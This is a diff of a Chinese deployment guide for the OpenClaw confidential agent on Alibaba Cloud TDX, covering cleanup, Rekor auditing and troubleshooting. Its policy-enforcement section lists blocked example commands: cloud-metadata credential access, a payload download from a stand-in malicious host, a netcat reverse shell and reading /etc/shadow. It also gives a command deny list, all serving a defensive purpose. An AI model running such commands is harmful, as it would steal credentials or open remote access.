+kill "$(cat "$HOME/.confidential-agent/one-click/connect-openclaw-vllm.pid")"     # openclaw-vllm
 ```
 
-> **警告**：
+> **警告**
 >
-> 销毁操作不可逆，会删除 ECS 实例、自定义镜像、OSS 对象、安全组、VPC、交换机等云资源。请确认不再需要实例中的数据后再执行。销毁完成并确认云资源已释放后，才建议删除本地状态目录：
+> 销毁操作不可逆，会删除 ECS 实例、自定义镜像、OSS 对象、安全组、VPC、交换机等云资源。确认云资源已释放后，才建议删除本地状态目录：
 >
 > ```bash
 > rm -rf "$HOME/.confidential-agent"
@@ -332,210 +335,113 @@ kill "$(cat "$HOME/.confidential-agent/one-click/connect.pid")"
 
 ![资源清理](images/04-resource-cleanup.svg)
 
-## 使用示例
+## PEP 策略拦截演示
 
-### 示例一：查询当前安全状态
+`cai-pep` 是运行时策略执行点。当 OpenClaw 通过 exec 工具执行命令时，请求会先经过 `cai-pep` 策略匹配，再进入隔离的 Docker sandbox 执行。
 
-OpenClaw 内置 `tdx-remote-attestation` skill。当用户询问安全相关问题时，OpenClaw 可触发远程证明能力，验证当前运行环境的安全状态。
+PEP 默认拦截：
 
-**触发方式**：在钉钉、Web 或 TUI 中询问以下问题：
-
-```text
-我的数据安全吗？
-这个环境可信吗？
-请验证当前 TDX 运行环境。
-```
-
-**返回内容关注点**：
-
-| 验证项 | 说明 |
-| --- | --- |
-| 硬件可信状态 | 验证实例运行在 Intel TDX Trust Domain 中（hardware 值 ≤ 32 视为通过）。 |
-| TEE 类型 | Intel TDX Trust Domain。 |
-| UKI 启动链完整性 | 镜像度量值与 Rekor 透明日志中的参考值一致。 |
-| dm-verity rootfs | rootfs 防篡改开启，运行时文件系统完整性受保护。 |
-| RATS-TLS 通道 | 客户端在建立连接前完成远程证明验证。 |
-
-### 示例二：PEP 策略拦截演示
-
-`cai-pep` 是为机密 AI Agent 设计的运行时门禁机制。当 OpenClaw 通过 `exec` 工具执行命令时，请求会先经过 `cai-pep` 进行策略匹配，再进入隔离的 Docker sandbox 执行。
-
-PEP 提供三层防护：
-
-1.  **命令级拦截**：基于黑名单拒绝高危命令，例如 `curl`、`wget`、`nc`、`ssh`、`docker` 等。
-2.  **路径级拦截**：阻止访问敏感路径，例如 `/etc`、`/proc`、`/root`、OpenClaw 配置目录等。
-3.  **网络隔离**：sandbox 默认无网络权限，即使命令绕过黑名单也无法发起外连。
-
-以下命令会被 PEP 拒绝：
-
-| 类型 | 示例命令 | 拦截原因 |
+| 类型 | 示例命令 | 目的 |
 | --- | --- | --- |
-| 网络访问 | `curl http://169.254.169.254/latest/meta-data/` | 防止访问云元数据服务泄露凭证。 |
-| 网络访问 | `wget http://malicious.example.com/payload` | 防止下载外部恶意代码。 |
-| 反向 Shell | `nc 10.0.0.99 4444 -e /bin/bash` | `nc` 命中命令黑名单。 |
+| 网络访问 | `curl http://169.254.169.254/latest/meta-data/` | 防止访问云元数据服务泄露凭据。 |
+| 下载外部代码 | `wget http://malicious.example.com/payload` | 防止 Prompt 注入下载恶意载荷。 |
+| 反向 Shell | `nc 10.0.0.99 4444 -e /bin/bash` | 阻止建立反向连接。 |
 | 远程登录 | `ssh root@external-host` | 防止越权访问外部系统。 |
 | 容器操作 | `docker ps` | 防止操作宿主机容器。 |
-| 敏感路径 | `cat /etc/shadow` | `/etc/shadow` 命中敏感路径前缀。 |
-
-例如，当 Agent 尝试执行以下命令访问云元数据服务时：
-
-```text
-运行：curl http://169.254.169.254/latest/meta-data/
-```
-
-PEP 会识别到 `curl` 在拒绝命令列表中，直接拦截该请求并返回拒绝信息，阻止凭证泄露。
+| 敏感路径 | `cat /etc/shadow` | 阻止读取敏感系统文件。 |
 
 ## Rekor 供应链审计
 
-部署流程默认使用 Rekor 透明日志来存储镜像参考值，在远程证明过程中自动从 Rekor 透明日志服务中获取日志条目，获取机密虚拟机的参考值。本节介绍如何对 Rekor 日志条目进行审计，验证供应链完整性。
-
-### 查看 Rekor 记录
-
-构建完成后，可在状态目录下找到 Rekor metadata：
+默认 `reference_values=rekor`。构建完成后，可在状态目录下找到 Rekor metadata：
 
 ```bash
 find "$HOME/.confidential-agent" -name "*.rekor-meta.json" -print
 ```
 
-每个条目对应一份 SLSA provenance，包含 log index 和 entry URL（含 UUID）。一键脚本输出的 Rekor 上传日志示例：
+每个条目对应一份 SLSA provenance，包含 log index 和 entry URL。远程证明注入时，Confidential Agent 会从 Rekor 拉取参考值并写入 Trustiflux，只有运行环境度量值与参考值匹配时，机密资源注入才会成功。
 
-```text
-Created entry at index 1205944956, available at: https://rekor.sigstore.dev/api/v1/log/entries/<uuid>
-```
-
-远程证明注入时，Confidential Agent 会从 Rekor 拉取参考值并写入 Trustiflux，只有运行环境度量值与参考值匹配时，机密资源注入才会成功。
-
-### 验证 Rekor 条目的包含性（inclusion proof）
-
-包含性证明用于确定记录着镜像参考值的条目确实存在于 Rekor 的默克尔树根（Merkle Root）中。可使用 tools 镜像内置的 `rekor-cli` 验证条目已被正确纳入透明日志：
+验证 inclusion proof：
 
 ```bash
 docker run --rm --network host confidential-agent-tools:latest \
-  rekor-cli verify --log-index 1205944956 --rekor_server https://rekor.sigstore.dev
+  rekor-cli verify --log-index <LOG_INDEX> --rekor_server https://rekor.sigstore.dev
 ```
 
-如果输出中包含两段相同 hash 值，则说明验证成功：
-
-```text
-Computed Root Hash: 1291abcee27148a4c00241ba8719f798ce060e8a5ccc8b18249017c25c6d0090
-Expected Root Hash: 1291abcee27148a4c00241ba8719f798ce060e8a5ccc8b18249017c25c6d0090
-```
-
-### 验证 Rekor 条目的一致性（consistency proof）
-
-一致性证明可确定一个较旧的默克尔树根（Root A）是较新的默克尔树根（Root B）的前缀或历史状态，从而确保 Rekor 上存储的参考值条目没有被删改：
+查看 Rekor 日志一致性：
 
 ```bash
 docker run --rm --network host confidential-agent-tools:latest \
   rekor-cli loginfo --rekor_server https://rekor.sigstore.dev
 ```
 
-如果看到输出中包含如下内容，则说明验证成功：
-
-```text
-Verification Successful!
-```
-
-## 注意事项
-
-> **重要**：以下注意事项直接影响服务的正常运行，请务必仔细阅读。
-
-### 安全组规则
-
-一键部署过程中将自动创建安全组规则。如需后续修改，请确保保留以下端口：
-
-| 端口 | 协议 | 说明 | 建议 |
-| --- | --- | --- | --- |
-| 22 | TCP | SSH 远程管理（仅 Debug 镜像） | 限制源 IP 为管理网络。 |
-| 18789 | TCP | TNG 隧道端点（RATS-TLS），用于访问 OpenClaw 服务 | 限制源 IP 或仅通过 TNG 访问。 |
-
-> **重要**：
->
-> 默认 operator CIDR 为部署机公网出口 IP `/32`。如果手工指定 `0.0.0.0/0`，请同时降低 OpenClaw Gateway Token 暴露风险，并在生产环境改回具体公网出口或企业出口 CIDR。
-
-### 百炼 API Key 与配额
-
-百炼 API Key 决定了实例可用的模型与配额。建议：
-
-1.  使用最小必要配额的 API Key，避免使用主账号 Key。
-2.  注入实例后定期轮换：重新 `export DASHSCOPE_API_KEY` 后重跑一键脚本即可；如需同时轮换 OpenClaw Gateway Token，再删除 `secrets/gateway.token`。
-3.  结合百炼控制台的访问审计，对调用量异常做告警。
-
-### 钉钉接入
-
-启用钉钉接入后：
-
-1.  钉钉应用必须具备 stream/接收消息所需的权限，否则机器人无法正常对话。
-2.  `Client ID` 与 `Client Secret` 仅在 TDX 实例内使用，部署机和源码仓库不会留存。
-3.  本地 connect 隧道断开不会影响钉钉链路，因为钉钉直连云端 TDX 实例的 OpenClaw。
-
 ## 常见问题
 
 #### Q1：`peering 'ops' already exists with a different CIDR`
 
-**处理方式**：
-
-该错误表示当前状态目录中已存在不同 CIDR 的 operator peering。请执行以下操作之一：
-
-*   重新传入与已存在 peering 一致的 `--allowed-cidr`，多 CIDR 场景会使用 `ops`、`ops-2`、`ops-3` 等标签。
-*   在交互模式中确认替换。
-*   非交互模式下追加 `--yes`。
+传入与现有 peering 一致的 `--allowed-cidr`，或在交互模式确认替换；非交互模式下追加 `--yes`。
 
 #### Q2：`Shelter is required` 或 `SLSA generator is required`
 
-**处理方式**：
-
-该错误表示部署机未安装 Shelter，或 Rekor 模式找不到 Shelter 的 SLSA generator。请执行以下操作之一：
-
-*   确认仓库 `hack/` 目录下存在 `shelter-*.rpm`，或通过 `--shelter-rpm` 指定 RPM 路径。
-*   重新安装 Shelter RPM，确保 `/usr/libexec/shelter/slsa/slsa-generator` 存在。
-*   仅本地开发验证场景下，使用 `--reference-values sample` 跳过 Rekor 流程。
+确认仓库 `hack/` 下存在 `shelter-*.rpm`，或通过 `--shelter-rpm` 指定 RPM。
 
 #### Q3：Web 端口打不开
 
-**处理方式**：
+检查 connect 日志和安全组：
 
-请按以下顺序检查：
+```bash
+tail -F "$HOME/.confidential-agent/one-click/connect.log"
+tail -F "$HOME/.confidential-agent/one-click/connect-openclaw-vllm.log"
+confidential-agent status --live
+```
 
-1.  查看 `connect.log`：`tail -F "$HOME/.confidential-agent/one-click/connect.log"`。
-2.  检查 ECS 实例安全组是否放通 `ops` 和 `deployer` 两个 operator peering。
-3.  部署机公网出口 IP 发生变化时，重新运行一键脚本，或执行 `peering remove deployer` 后按新出口 IP 添加 `deployer` peering。
+如果部署机公网出口 IP 变化，重新运行一键脚本或更新 `deployer` peering。
 
-#### Q4：OpenClaw chat 不可用
+#### Q4：百炼 API 场景 chat 不可用
 
-**处理方式**：
+优先检查 `DASHSCOPE_API_KEY`、模型是否可用、账号是否欠费，以及 guest 中 OpenClaw 网关日志：
 
-由于本方案的推理由百炼 API 完成，chat 请求失败通常与百炼配置、Gateway Token 或手动启用 device auth 后的 pairing 状态有关：
+```bash
+journalctl -u cai-openclaw-gateway.service -n 200 --no-pager
+```
 
-1.  检查 `DASHSCOPE_API_KEY` 是否生效。可在部署机执行：
-    ```bash
-    curl -sS https://dashscope.aliyuncs.com/api/v1/services/aigc/text-generation/generation \
-      -H "Authorization: Bearer $DASHSCOPE_API_KEY" \
-      -H "Content-Type: application/json" \
-      --data '{"model":"qwen-turbo","input":{"prompt":"hi"}}' | head
-    ```
-2.  检查所选模型在百炼控制台是否处于可用状态、是否欠费。
-3.  通过 debug SSH 登录 guest，查看 OpenClaw 网关日志：
-    ```bash
-    journalctl -u cai-openclaw-gateway.service -n 200 --no-pager
-    ```
+#### Q5：vLLM 场景长时间不可用
 
-#### Q5：钉钉无响应
+vLLM 首次启动需要安装 GPU 驱动、准备 Python 环境、下载模型并启动模型服务。如果为了排障显式部署了 `debug` 变体，可通过 debug SSH 登录 guest 后检查：
 
-**处理方式**：
+```bash
+nvidia-smi
+systemctl status cai-nvidia-cc-bootstrap.service --no-pager -l
+systemctl status cai-modelscope-fetch.service --no-pager -l
+systemctl status cai-vllm.service --no-pager -l
+curl -fsS http://127.0.0.1:8090/v1/models
+journalctl -u cai-openclaw-gateway.service -n 200 --no-pager
+```
 
-请按以下顺序检查：
+如果 `/dev/nvidia0` 不存在，优先检查实例是否为 `ecs.gn8v-tee.*`、GPU 驱动安装日志和内核模块加载状态。
 
-1.  部署时是否传入 `--enable-dingtalk` 或在交互模式中启用钉钉。
-2.  guest 内 `openclaw status` 是否显示 `DingTalk` channel 为 `ON`。
-3.  `journalctl -u cai-openclaw-gateway.service -n 200 --no-pager` 中是否存在 `dingtalk` 连接错误；如果出现 HTTP 401，优先检查钉钉 `Client ID` 和 `Client Secret` 是否与钉钉开放平台一致。
-4.  钉钉应用是否具备发送/接收消息所需的权限。
+#### Q6：TDX skill 无法确认环境可信
 
-#### Q6：cai-pep 拒绝所有工具调用
+确认 `cai-pep`、Trustiflux API server 和 attestation agent 正常：
 
-**处理方式**：
+```bash
+systemctl status cai-pep.service trustiflux-api-server.service attestation-agent.service --no-pager -l
+cai-pep attest collect-and-verify --aa-url http://localhost:8006 --tee tdx --policy default --claims
+```
 
-使用 Debug 镜像部署后，通过 SSH 连接登录 TDX 实例，查看 cai-pep 日志排查具体的拒绝原因：
+如果命令没有返回 JSON claims、缺少 trustworthiness vector、缺少 `mr_td`/`rtmr_*`/UKI 度量等关键字段，不能声称远程证明通过。
+
+#### Q7：钉钉无响应
+
+检查部署时是否传入 `--enable-dingtalk`，钉钉 `Client ID`/`Client Secret` 是否正确，钉钉应用是否具备发送和接收消息权限，并查看：
+
+```bash
+openclaw status
+journalctl -u cai-openclaw-gateway.service -n 200 --no-pager
+```
+
+#### Q8：`cai-pep` 拒绝所有工具调用
+
+查看 PEP 日志定位策略拒绝原因：
 
 ```bash
 journalctl -u cai-pep.service -n 200 --no-pager
@@ -543,4 +449,11 @@ journalctl -u cai-pep.service -n 200 --no-pager
 
 ## 结果验证记录
 
-本文对应的 E2E 以 one-click OpenClaw + Bailian 为主路径，覆盖默认 PEP 和 `--disable-pep` 两个分支；验证项包括依赖安装、Shelter RPM 安装、源码构建、tools 镜像构建、可信镜像构建、Rekor 上传、阿里云 TDX ECS 创建、远程证明资源注入、mesh 同步、TNG connect、Web 可达性、Gateway Token 鉴权、通过百炼 API 完成的 OpenClaw chat probe，以及默认 PEP 分支的 TDX skill probe。
+本最佳实践对应的验证范围包括：
+
+| 场景 | 验证项 |
+| --- | --- |
+| one-click OpenClaw + 百炼 API | 依赖安装、Shelter RPM 安装、源码构建、tools 镜像构建、可信镜像构建、Rekor 上传、TDX ECS 创建、资源注入、TNG connect、Web 可达性、Gateway Token 鉴权、chat probe、TDX skill probe。 |
+| one-click OpenClaw + vLLM | vLLM spec/config 生成、NVIDIA CC bootstrap 文件打包、PEP/TDX skill 打包、GPU TEE spec 校验、Rekor 配置、connect/Web readiness、vLLM `/v1/models` readiness、OpenClaw chat probe。 |
+
+完整云端验证必须在全新的 Alibaba Cloud Linux 3 部署机上执行文档中的 one-click 命令，不复用本地开发机或旧状态目录。
